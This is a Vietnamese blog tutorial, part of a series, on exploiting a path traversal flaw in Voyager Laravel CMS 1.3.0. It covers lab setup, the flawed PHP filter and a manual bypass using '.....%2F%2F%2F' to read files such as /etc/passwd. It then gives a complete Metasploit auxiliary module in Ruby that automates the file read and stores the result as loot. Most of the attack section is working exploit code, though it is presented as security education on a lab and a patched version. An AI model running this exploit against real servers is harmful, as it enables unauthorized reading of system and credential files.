![](https://images.viblo.asia/c74ff2b3-bb74-4a77-a3fb-afb4e607d250.jpg)

Tiếp nối những kiến thức còn dang dở ở [phần 2 ](https://viblo.asia/p/ky-thuat-khai-thac-lo-hong-bao-mat-web-tren-metasploit-framework-p2-RQqKLQr4Z7z) .  Hôm nay chúng ta sẽ tiếp tục cùng nhau viết một mã khai thác đơn giản trên Metasploit Framework.

## 7. Kịch bản khai thác lỗ hổng Path traversal trong CMS Voyager Laravel

Do mục tiêu hướng tới là viết mã khai thác đơn giản, nên việc chọn lựa nền tảng kiểm thử ban đầu là khá quan trọng. Chúng ta cố gắng chọn những lỗ hổng dễ khai thác, con đường khai thác ngắn và ít tốn công nhất. Ở đây mình chọn lỗ hổng Path traversal trong CMS Voyager Laravel vì nó đáp ứng đầy đủ các yêu cầu trên. Mức độ khai thác dễ dàng cũng như dễ hình dung tính hiệu quả của mã. Lỗ hổng này do một người đồng nghiệp của mình tìm ra và public tại [đây](https://www.exploit-db.com/exploits/47875) 

**7.1 Dựng môi trường thử nghiệm**

Voyager là một ứng dụng web mã nguồn mở xây dựng trên Framework Laravel của PHP. Voyager là mã nguồn mở và hiện đang được phát triển tại https://github.com/the-control-group/voyager. Ứng dụng giúp người sử dụng có thể tạo ra một trang quản trị hệ thống một cách nhanh chóng và dễ dàng.

Để có thể cài đặt Voyager, trước tiên chúng ta cần cài đặt PHP và Laravel. Phần sau đây hướng dẫn cài đặt PHP và Laravel trên môi trường máy chủ Centos 7.0

Đầu tiên sử dụng lệnh sau để cài đặt máy chủ web Apache:

```bash
# yum install httpd -y
```

Sau khi cài xong, khởi động Apache và đặt cho Apache khởi chạy cùng hệ thống:

```bash
# systemctl start httpd
```

Cài đặt rules cho firewall để Apache có thể hoạt động:

```bash
# firewall-cmd --permanent --add-port=80/tcp
# firewall-cmd --permanent --add-port=443/tcp
```

Cài đặt hệ quản trị cơ sở dữ liệu Mysql:

```bash
# yum install mariadb-server php-mysql
# systemctl start mariadb.service
```

Cài đặt PHP 7.2

```bash
# yum install yum-utils
# yum-config-manager --enable remi-php72
```

Cài đặt “composer” và  “Laravel”:

```bash
# curl -sS https://getcomposer.org/installer | php
# mv composer.phar /usr/bin/composer
```

Sau khi đã xây dựng được môi trường cần thiết trên máy chủ. Chúng ta tiến hành cài đặt Voyager version  1.3.0:

```bash
# composer require tcg/voyager:1.3.0
```

Tạo một cơ sở dữ liệu với Mysql sau đó chỉnh sửa tệp “.env” tại đường dẫn thư mục: “/var/www/html/voyager/.env” và thêm vào các thông số cấu hình như sau:

```
DB_HOST=localhost
DB_DATABASE=voyager
DB_USERNAME=voyager
DB_PASSWORD=secret
```

Bắt đầu quá trình cài đặt và cấu hình Voyager tự động:

```
# cd /var/www/html/voyager/
# php artisan voyager:install
```

Sau khi thực hiện các bước trên, Voyager đã được cài đặt thành công trên máy chủ.
Sử dụng lệnh sau để có thể chạy dịch vụ. Thêm tham số “--host = 0.0.0.0” để Voyager có thể truy cập từ các địa chỉ ip bên ngoài.

```
# php artisan serve --host=0.0.0.0
```

Mặc định Voyager sẽ chạy trên cổng 8000. Có thể sử dụng tham số “--port=[port]” để thay đổi cổng dịch vụ Voyager lắng nghe.

Sau khi chạy chương trình, truy cập địa chỉ http://ip:8000/admin để vào trang quản trị của Voyager:

![](https://images.viblo.asia/a62f548b-3599-4133-be72-5d983f21d579.png)

**7.2 Khai thác lỗ hổng Path traversal trong CMS Voyager Laravel bằng "tay"**

Chúng ta cùng xem qua mã nguồn của API :

```php
public function assets(Request $request)
{
    $path = Str::start(str_replace(['../', './'], '', urldecode($request->path)), '/');
    $path = base_path('vendor/tcg/voyager/publishable/assets'.$path);
     if (File::exists($path)) {
            $mime = '';
            if (Str::endsWith($path, '.js')) {
                $mime = 'text/javascript';
            } elseif (Str::endsWith($path, '.css')) {
                $mime = 'text/css';
            } else {
                $mime = File::mimeType($path);
            }      
```

Trong các ứng dụng xây dựng trên Voyager có một API là “*GET /admin/voyager-assets?path=[....]*”.  Với tham số “path” là đường dẫn tới các tệp tài nguyên như hình ảnh, javascript,files ... của ứng dụng.

Đoạn mã trên đã cố gắng chống lại “Path traversal” bằng cách xóa đi những chuỗi “../” và “./” nhưng rõ ràng là chưa triệt để.  Kẻ tấn công có thể dễ dàng bypass bằng cách sử dụng các chuỗi kí tự “.....%2F%2F%2F”. Từ đó có thể khai thác “Path traversal” và đọc được các tệp tin hệ thống trên máy chủ:

![](https://images.viblo.asia/4cd0d894-13a3-4b0b-88cf-6f4e1b99252d.png)

Lỗ hổng trên đã được vá từ các phiên bản >1.3.0. Chi tiết về bản vá tại [đây](https://github.com/the-control-group/voyager/pull/4569/commits/9d8c5fd7705176580cf1f8e564e5739404a0c669):  

**7.3 Khai thác lỗ hổng Path traversal trong CMS Voyager Laravel bằng Metasploit Framework**

Trước tiên cần khai báo các thông tin về lỗ hổng và các tham số cần thiết:

```ruby
class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
  
    def initialize(info = {})
      super(update_info(info,
        'Name'        => 'Laravel Voyager Directory Traversal',
        'Description' => %q{
          This module exploits a directory traversal vulnerability which
          exists in Laravel Voyager < 1.3.0.
        },
        'References'  =>      [
          ],
        'Author'      =>         [
          ],
        'DisclosureDate' => 'Aug 03 2019',
        'License'     => MSF_LICENSE
      ))
```

Hai câu lệnh sau dùng để khai báo hai tham số cần thiết cho việc khai thác. “FILEPATH” là đường dẫn tuyệt đối của tệp trên máy chủ. “DEPTH” là tham số xác định bậc của thư mục Voyager hiện hành. Mặc định được để là 10:

  ```ruby
    register_options(
        [
          OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
          OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])
        ])
    end
```

Tiếp là phần mã dùng để gửi yêu cầu đến máy chủ và khai thác lỗ hổng:

```ruby
def run_host(ip)
      filename = datastore['FILEPATH']
      traversal = '.....%2F%2F%2F' * datastore['DEPTH'] << filename
  
      res = send_request_raw({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, "admin/voyager-assets?path=#{traversal}"),
        'vars_get' => {'path' => traversal}
      })

      unless res && res.code == 200
        print_error('Nothing was downloaded')
        return
end
      vprint_good("#{peer} - \n#{res.body}")
      path = store_loot(
        filename,
        'text/plain',
        ip,
        res.body,
        filename
      )
      print_good("File saved in: #{path}")
    end
```

Do lỗ hổng không yêu cầu xác thực và nền tảng kiểm thử không sử dụng các phương pháp đảm bảo an toàn tối thiểu, nên việc viết mã khai thác là tương đối dễ dàng. 


**7.3.1 Sử dụng mã khai thác**

Lưu mã khai thác vào thư mục cài đặt Metasploit Framework  “**/usr/share/metasploit-framework/modules/exploits/myexploits/voyager.rb**”. Sau đó khởi động Voyager. Đặt các tham số cần thiết cho việc khai thác:

![](https://images.viblo.asia/cfdc7c9e-20cd-48f0-86e1-25b406674f28.png)


Sau khi khai thác,  Metasploit Framework sẽ trả lại đường dẫn lưu tệp. Sử dụng lệnh cat để xem nội dung tệp:

![](https://images.viblo.asia/ad4652fa-dce8-4858-bd1c-21e477c2b13f.png)


## 8. Tổng kết

Qua đây, chúng ta đã cùng nhau xây dựng thành công một mã khai thác đơn giản trên Metasploit Framework . Ở phần tiếp theo, mình sẽ trình bày các mã khai thác khó hơn, con đường khai thác dài và phức tạp hơn. Xin cảm ơn mọi người đã đọc tới đây, hẹn gặp lại ở phần 4.

Tài liệu tham khảo :

https://github.com/rapid7/metasploit-framework/wiki

https://www.offensive-security.com/metasploit-unleashed/

Thank to @doandinhlinh